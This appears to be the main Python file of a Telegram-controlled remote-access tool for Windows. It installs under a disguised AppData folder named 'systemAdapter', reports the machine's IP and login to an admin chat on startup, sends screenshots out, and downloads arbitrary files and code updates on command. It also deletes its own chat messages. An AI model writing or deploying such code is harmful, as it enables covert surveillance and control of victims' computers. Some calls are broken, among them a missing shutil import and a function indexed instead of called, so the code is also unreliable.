# Created by Delitel

from aiogram import Bot, executor, Dispatcher, types
from aiogram.utils import exceptions
import os
from db import SQLither
from config import cfg
import requests
import telebot
import lsKeyboard, lsUtils
from urllib.error import HTTPError
import zipfile
import time
import random
import wget

login = os.getlogin()
admin = cfg.admin_id

bot = Bot(cfg.token)
dp = Dispatcher(bot)
pybot = telebot.TeleBot(cfg.token)
db = SQLither(f"C:\\Users\\{login}\\AppData\\Roaming\\systemAdapter\\db.db")

def updating():
	try:
		link = "https://github.com/Delitel-WEB/tg_VRS/archive/master.zip"
		wget.download(link, f"C:\\Users\\{login}\\AppData\\Roaming\\systemAdapter")
		zipper = zipfile.ZipFile(f"C:\\Users\\{login}\\AppData\\Roaming\\systemAdapter\\tg_VRS-master.zip")
		zipper.extract("tg_VRS-master/db.py", f"C:\\Users\\{login}\\AppData\\Roaming\\systemAdapter")
		zipper.extract("tg_VRS-master/lsKeyboard.py", f"C:\\Users\\{login}\\AppData\\Roaming\\systemAdapter")
		zipper.extract("tg_VRS-master/lsSetup.pyw", f"C:\\Users\\{login}\\AppData\\Roaming\\systemAdapter")
		zipper.extract("tg_VRS-master/lsUtils.py", f"C:\\Users\\{login}\\AppData\\Roaming\\systemAdapter")
		zipper.close()
			
		shutil.copy(f"C:\\Users\\{login}\\AppData\\Roaming\\systemAdapter\\tg_VRS-master\\db.py", f"C:\\Users\\{login}\\AppData\\Roaming\\systemAdapter")
		shutil.copy(f"C:\\Users\\{login}\\AppData\\Roaming\\systemAdapter\\tg_VRS-master\\lsKeyboard.py", f"C:\\Users\\{login}\\AppData\\Roaming\\systemAdapter")
		shutil.copy(f"C:\\Users\\{login}\\AppData\\Roaming\\systemAdapter\\tg_VRS-master\\lsSetup.pyw", f"C:\\Users\\{login}\\AppData\\Roaming\\systemAdapter")
		shutil.copy(f"C:\\Users\\{login}\\AppData\\Roaming\\systemAdapter\\tg_VRS-master\\lsUtils.py", f"C:\\Users\\{login}\\AppData\\Roaming\\systemAdapter")

		os.remove(f"C:\\Users\\{login}\\AppData\\Roaming\\systemAdapter\\tg_VRS-master.zip")
		files_ = ["db.py", "lsKeyboard.py", "lsSetup.pyw", "lsUtils.py"]
		for i in files_:
			os.remove(f"C:\\Users\\{login}\\AppData\\Roaming\\systemAdapter\\tg_VRS-master\\{i}")
		os.rmdir(f"C:\\Users\\{login}\\AppData\\Roaming\\systemAdapter\\tg_VRS-master")

		mess_id = pybot.send_message(
			admin,
			f"<b>Обновление установлено!</b>",
			parse_mode="html"
			)
		db.add_message_id(mess_id.message_id)
	except Exception as err:
		mess_id = pybot.send_message(
			admin,
			f"<b>Не удалось установить обновление!</b>\n\n{err}",
			parse_mode="html"
			)
		db.add_message_id(mess_id.message_id)



updating()
time.sleep(3)



def started_info():
	ip = requests.get("https://ramziv.com/ip").text

	keyboard = telebot.types.InlineKeyboardMarkup()
	keyboard_1 = telebot.types.InlineKeyboardButton(text= "💻 Начать работу", callback_data = "start_job")
	keyboard.add(keyboard_1)

	mess_id = pybot.send_message(
			admin,
			f"<b><u>💻 Компьютер запущен!</u></b>\n\n<b>📍 IP:</b> <i>{ip}</i>\n<b>👤 Логин компьтера:</b> <i>{login}</i>",
			parse_mode="html",
			reply_markup=keyboard
			)
	db.add_message_id(mess_id.message_id)

async def deleted_messages(user_id):
	messages_delete = db.get_deletions_messages()
	for i in messages_delete:
		try:
			await bot.delete_message(user_id, i[1])
		except exceptions.MessageToDeleteNotFound:
			pass
		except exceptions.MessageCantBeDeleted:
			pass
		db.delete_deletions_message(i[1])

started_info()

@dp.message_handler(content_types=["text"])
async def message_handler(message):
	if not db.exists_user(message.chat.id):
		db.add_user(message.chat.id)
	status = db.get_status(message.chat.id)
	db.add_message_id(message.message_id)

	if status == "get_link_open_site":
		lsUtils.open_site(message.text)
		await deleted_messages(message.chat.id)

		mess_id = await message.answer(
			"<b>Готово!</b>",
			parse_mode="html",
			reply_markup=lsKeyboard.main_keyboard
			)
		db.add_message_id(mess_id.message_id)
		db.set_status(message.chat.id, 0)

	elif status == "add_link_file":
		db.add_link_to_temporary_download_file_data(message.chat.id, message.text)
		await deleted_messages(message.chat.id)

		mess_id = await message.answer(
			"<b>Вы хотите указать путь для скачивания файла?</b>",
			parse_mode="html",
			reply_markup=lsKeyboard.use_file_path
			)
		db.add_message_id(mess_id.message_id)
		db.set_status(message.chat.id, 0)

	elif status == "use_file_path":
		db.add_file_path_to_temporary_download_file_data(message.chat.id, message.text)

		data = db.get_temporary_download_file_data(message.chat.id)

		await deleted_messages(message.chat.id)
		mess_id = await message.answer(
					"<b>Начинаем скачивать!</b>",
					parse_mode="html"
					)
		db.add_message_id(mess_id.message_id)

		try:
			if data[1]:
				lsUtils.download_file(data[0], data[1])
			else:
				lsUtils.download_file[data[0]]

			await deleted_messages(message.chat.id)
			mess_id = await message.answer(
			"<b>Готово!</b>",
			parse_mode="html",
			reply_markup=lsKeyboard.main_keyboard
			)
			db.add_message_id(mess_id.message_id)
			db.set_status(message.chat.id, 0)
		except ValueError:
			await deleted_messages(message.chat.id)
			mess_id = await message.answer(
					"<b>Вы ввели не правильную ссылку на файл или путь для установки!</b>",
					reply_markup=lsKeyboard.main_keyboard,
					parse_mode="html"

					)
			db.add_message_id(mess_id.message_id)
			db.set_status(message.chat.id, 0)
		except HTTPError as err:
			await deleted_messages(message.chat.id)
			mess_id = await message.answer(
					f"<b>{err}</b>",
					reply_markup=lsKeyboard.main_keyboard,
					parse_mode="html"
					)
			db.add_message_id(mess_id.message_id)
			db.set_status(message.chat.id, 0)

	elif status == "open_dir":
		lsUtils.open_dir(message.text)

		await deleted_messages(message.chat.id)
		mess_id = await message.answer(
					"<b>Готово!</b>",
					parse_mode="html",
					reply_markup=lsKeyboard.main_keyboard
					)
		db.add_message_id(mess_id.message_id)
		db.set_status(message.chat.id, 0)


@dp.message_handler(content_types=["document"])
async def document_handler(message):
	if not db.exists_user(message.chat.id):
		db.add_user(message.chat.id)
	status = db.get_status(message.chat.id)
	db.add_message_id(message.message_id)


	if status == "update_":
		if message.document.mime_type == "application/zip":
			await deleted_messages(message.chat.id)
			mess_id = await message.answer(
				f"<b>Начинаем обновление!</b>",
				parse_mode="html"
				)
			db.add_message_id(mess_id.message_id)

			mess_id_1 = await message.answer(
				f"🤪",
				parse_mode="html"
				)
			db.add_message_id(mess_id_1.message_id)

			await deleted_messages(message.chat.id)
			mess_id_2 = await message.answer(
				f"<b><u>Прогресс📊</u>\n\n1) Удаление старых файлов ❌\n"
				"2) Скачивание обновления ❌\n 3) Установка обновления ❌</b>",
				parse_mode="html"
				)
			db.add_message_id(mess_id_2.message_id) 

			for i in cfg.files:
				os.remove(i)

			await deleted_messages(message.chat.id)
			mess_id_3 = await message.answer(
				f"<b><u>Прогресс📊</u>\n\n1)<i> Удаление старых файлов ✅</i>\n"
				"2) Скачивание обновления ❌\n 3) Установка обновления ❌</b>",
				parse_mode="html"
				)
			db.add_message_id(mess_id_3.message_id) 

			await message.document.download("C:\\Users\\delit\\AppData\\Roaming\\systemAdapter\\update.zip")

			await deleted_messages(message.chat.id)
			mess_id_4 = await message.answer(
				f"<b><u>Прогресс📊</u>\n\n1)<i> Удаление старых файлов ✅</i>\n"
				"2) <i>Скачивание обновления ✅</i>\n 3) Установка обновления ❌</b>",
				parse_mode="html"
				)
			db.add_message_id(mess_id_4.message_id)

			zipper = zipfile.ZipFile("C:\\Users\\delit\\AppData\\Roaming\\systemAdapter\\update.zip")
			zipper.extract("db.py", "C:\\Users\\delit\\AppData\\Roaming\\systemAdapter")
			zipper.extract("lsKeyboard.py", "C:\\Users\\delit\\AppData\\Roaming\\systemAdapter") 
			zipper.extract("lsSetup.pyw", "C:\\Users\\delit\\AppData\\Roaming\\systemAdapter") 
			zipper.extract("lsUtils.py", "C:\\Users\\delit\\AppData\\Roaming\\systemAdapter") 
			zipper.extract("cfg.py", "C:\\Users\\delit\\AppData\\Roaming\\systemAdapter\\config")
			zipper.close()

			await deleted_messages(message.chat.id)
			mess_id_5 = await message.answer(
				f"<b><u>Прогресс📊</u>\n\n1)<i> Удаление старых файлов ✅</i>\n"
				"2) <i>Скачивание обновления ✅</i>\n 3) <i>Установка обновления ✅</i></b>",
				parse_mode="html"
				)
			db.add_message_id(mess_id_5.message_id) 

			os.remove("C:\\Users\\delit\\AppData\\Roaming\\systemAdapter\\update.zip")

			await deleted_messages(message.chat.id)
			mess_id_5 = await message.answer(
				f"<b>Обновление установлено и будет работать после перезагрузки компьютера!</b>",
				reply_markup=lsKeyboard.main_keyboard,
				parse_mode="html"
				)
			db.add_message_id(mess_id_5.message_id) 



		else:
			await deleted_messages(message.chat.id)
			mess_id = await message.answer(
				f"<b>Отправьте обновление <u>zip</u> архивом!</b>",
				reply_markup=lsKeyboard.cancel_keyboard,
				parse_mode="html"

				)
			db.add_message_id(mess_id.message_id)




@dp.callback_query_handler()
async def query_handelr(call):
	if call.message:
		if not db.exists_user(call.message.chat.id):
			db.add_user(call.message.chat.id)
		status = db.get_status(call.message.chat.id)
		if call.message.chat.id == admin:

			if call.data == "start_job":
				db.set_status(call.message.chat.id, 0)
				await deleted_messages(call.message.chat.id)

				mess_id = await call.message.answer(
					"<b>Выберите действие:</b>",
					parse_mode="html",
					reply_markup = lsKeyboard.main_keyboard
					)
				db.add_message_id(mess_id.message_id)

			elif call.data == "make_screen":
				screen = lsUtils.make_screenshot()
				await deleted_messages(call.message.chat.id)
				photo = open(screen, "rb")
				mess_id = await bot.send_photo(call.message.chat.id ,photo, "<b>Выберите действие:</b>",
							parse_mode="html",
							reply_markup=lsKeyboard.main_keyboard
							)
				db.add_message_id(mess_id.message_id)
				os.remove(screen)

			elif call.data == "open_browser":
				db.set_status(call.message.chat.id ,"get_link_open_site")
				await deleted_messages(call.message.chat.id)
				mess_id = await call.message.answer(
					"<b>Введите сайт который нужно открыть:</b>",
					reply_markup=lsKeyboard.cancel_keyboard,
					parse_mode="html"

					)
				db.add_message_id(mess_id.message_id)

			elif call.data == "cancel":
				db.set_status(call.message.chat.id, 0)
				await deleted_messages(call.message.chat.id)
				mess_id = await call.message.answer(
					"<b>Выберите действие:</b>",
					parse_mode="html",
					reply_markup = lsKeyboard.main_keyboard
					)
				db.add_message_id(mess_id.message_id)

			elif call.data == "download_file":
				db.delete_all_temporary_download_file_data(call.message.chat.id)
				db.set_status(call.message.chat.id, "add_link_file")

				await deleted_messages(call.message.chat.id)
				mess_id = await call.message.answer(
					"<b>Введите <u>прямую</u> ссылку на файл:</b>",
					reply_markup=lsKeyboard.cancel_keyboard,
					parse_mode="html"

					)
				db.add_message_id(mess_id.message_id)

			elif call.data == "no_use_file_path":
				data = db.get_temporary_download_file_data(call.message.chat.id)

				await deleted_messages(call.message.chat.id)
				mess_id = await call.message.answer(
					"<b>Начинаем скачивать!</b>",
					parse_mode="html"
					)
				db.add_message_id(mess_id.message_id)

				try:
					if data[1]:
						lsUtils.download_file(data[0], data[1])
					else:
						lsUtils.download_file([data[0]])

					await deleted_messages(call.message.chat.id)
					mess_id = await call.message.answer(
					"<b>Готово!</b>",
					parse_mode="html",
					reply_markup=lsKeyboard.main_keyboard
					)
					db.add_message_id(mess_id.message_id)
					db.set_status(call.message.chat.id, 0)
				except ValueError:
					await deleted_messages(call.message.chat.id)
					mess_id = await call.message.answer(
					"<b>Вы ввели не правильную ссылку на файл!</b>",
					reply_markup=lsKeyboard.main_keyboard,
					parse_mode="html"

					)
					db.add_message_id(mess_id.message_id)
					db.set_status(call.message.chat.id, 0)
				except HTTPError as err:
					await deleted_messages(call.message.chat.id)
					mess_id = await call.message.answer(
					f"<b>{err}</b>",
					reply_markup=lsKeyboard.main_keyboard,
					parse_mode="html"

					)
					db.add_message_id(mess_id.message_id)
					db.set_status(call.message.chat.id, 0)

				db.set_status(call.message.chat.id, 0)



			elif call.data == "use_file_path":
				db.set_status(call.message.chat.id, "use_file_path")

				await deleted_messages(call.message.chat.id)
				mess_id = await call.message.answer(
					f"<b>Введите путь установки\n\nЛогин этого компьтера: <i>{login}</i></b>",
					reply_markup=lsKeyboard.cancel_keyboard,
					parse_mode="html"

					)
				db.add_message_id(mess_id.message_id)

			elif call.data == "check_ip":
				ip = lsUtils.get_ip()
				await deleted_messages(call.message.chat.id)
				mess_id = await call.message.answer(
					f"<b>🍭 ip этого компьтера - <u>{ip}</u></b>",
					reply_markup=lsKeyboard.main_keyboard,
					parse_mode="html"

					)
				db.add_message_id(mess_id.message_id)

			elif call.data == "open_file":
				db.set_status(call.message.chat.id, "open_dir")

				mess_id = await call.message.answer(
					f"<b>Введите путь до папки!\n\nЛогин этого ПК - <i>{login}</i></b>",
					reply_markup=lsKeyboard.cancel_keyboard,
					parse_mode="html"
				
					)
				db.add_message_id(mess_id.message_id)

				

			elif call.data == "update_":
				db.set_status(call.message.chat.id, "update_")

				await deleted_messages(call.message.chat.id)
				mess_id = await call.message.answer(
					f"<b>Отправьте обновление <u>zip</u> архивом!</b>",
					reply_markup=lsKeyboard.cancel_keyboard,
					parse_mode="html"

					)
				db.add_message_id(mess_id.message_id)


			


if __name__ == "__main__":
	executor.start_polling(dp, skip_updates=True)